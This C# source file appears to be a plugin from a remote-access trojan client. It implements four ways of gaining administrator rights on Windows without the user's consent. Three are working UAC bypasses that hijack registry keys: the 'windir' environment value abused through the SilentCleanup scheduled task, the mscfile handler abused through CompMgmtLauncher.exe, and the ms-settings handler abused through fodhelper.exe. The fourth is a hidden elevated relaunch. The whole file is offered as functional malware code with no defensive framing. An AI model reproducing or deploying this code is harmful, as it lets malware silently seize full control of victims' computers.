using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace Plugin.Handler
{
    public class HandleUAC
    {
        public HandleUAC()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/k START \"\" \"" + Process.GetCurrentProcess().MainModule.FileName + "\" & EXIT",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        UseShellExecute = true
                    }
                };
                proc.Start();
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch
            {
            }
        }
    }

    public class HandleUACbypass
    {
        public HandleUACbypass()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey("Environment");
                key.SetValue("windir",
                    @"cmd.exe " + @"/k START " + Process.GetCurrentProcess().MainModule.FileName + " & EXIT");
                key.Close();

                var process = new Process();
                process.StartInfo.FileName = "schtasks.exe";
                process.StartInfo.Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
                process.Start();

                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch
            {
            }
        }
    }


    public class HandleUACbypass2
    {
        public HandleUACbypass2()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                key.Close();


                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"\System32\CompMgmtLauncher.exe";
                WinExec(@"cmd.exe /k START " + filePath, 0);
                Thread.Sleep(0);

                //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("mscfile");
                Thread.Sleep(1000);
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);
    }

    public class HandleUACbypass3
    {
        public HandleUACbypass3()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                RegistryKey key;
                RegistryKey command;
                key = Registry.CurrentUser;
                command = key.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
                command = key.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true);
                command.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                command.SetValue("DelegateExecute", "");
                key.Close();


                var system = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                var filePath = system + @"\System32\fodhelper.exe";
                WinExec(@"cmd.exe /k START " + filePath, 0);
                Thread.Sleep(0);

                //Registry.CurrentUser.OpenSubKey("Software", true).OpenSubKey("Classes", true).DeleteSubKeyTree("ms-settings");

                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern int WinExec(string exeName, int operType);
    }
}